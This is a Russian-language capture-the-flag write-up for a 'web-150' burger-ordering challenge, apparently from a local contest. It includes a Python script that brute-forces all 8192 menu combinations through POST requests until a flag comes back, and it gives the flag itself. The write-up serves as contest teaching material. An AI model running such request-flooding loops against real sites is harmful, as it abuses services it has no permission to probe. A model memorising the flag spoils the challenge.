# web-150

Зайдя на сайт, видим страничку с выбором блюд. При нажатии на кнопку нам либо выдается промокод, либо выводится сообщение о том, что такого промокода еще нету (выбирается случайно). Поиск флага в файлах и трафике ни к чему не приведет. Значит, флаг должен прийти к нам вместо промокода. Как вариант - попробовать порыться в файловой системе сервера и найти флаг там, но никаких намеков на категорию admin здесь нету. Значит, можно попробовать перебрать все возможные заказы. Всего их 2^13 (8192). Для этого напишем программу, которая будет перебирать все варинанты и отправлять post-запросы на сайт. Пример кода (solve.py):

    from requests import get, post
    
    SERVER = "SERVER:HOST"
    
    fields = ['cheeseburger', 'hamburger', 'shrimpburger', 'big_king', 'roll', 'potato_fri', 'potato_country', 'nuggets', 'chicken', 'icecream', 'coke', 'lipton', 'mirinda']
    
    values = ['n'] * 13
    
    
    def send(cntr):
        global values
        if cntr == 13:
            params = {"submit": "Take"}
            for i in range(0, 13):
                if values[i] == 'y':
                    params[fields[i]] = 'y'
            d = post(f'http://{SERVER}/web150', data=params)
            print(d.content.decode("utf-8"))
            return
        for var in 'n', 'y':
            values[cntr] = var
            send(cntr + 1)
    
    send(-1)
PS Контест проводился в локальной сети, флаг можно было получить спутся минтуту работы программы, на удаленной сети решение может работать гораздо дольше.

Флаг: **flag{burg3r5_4nd_c0k3_fr0m_j4cqu3_fr35c0}**